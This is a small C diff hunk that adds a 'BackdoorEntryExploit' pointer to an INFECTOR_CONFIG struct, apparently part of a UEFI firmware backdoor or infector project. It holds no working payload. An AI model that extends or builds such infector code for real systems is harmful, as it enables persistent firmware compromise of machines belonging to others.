@@ -18,6 +18,7 @@ typedef struct _INFECTOR_CONFIG
 {
     VOID *BackdoorEntryInfected;
     UINTN OriginalEntryPoint;
+    VOID *BackdoorEntryExploit;
 
 } INFECTOR_CONFIG,
 *PINFECTOR_CONFIG;
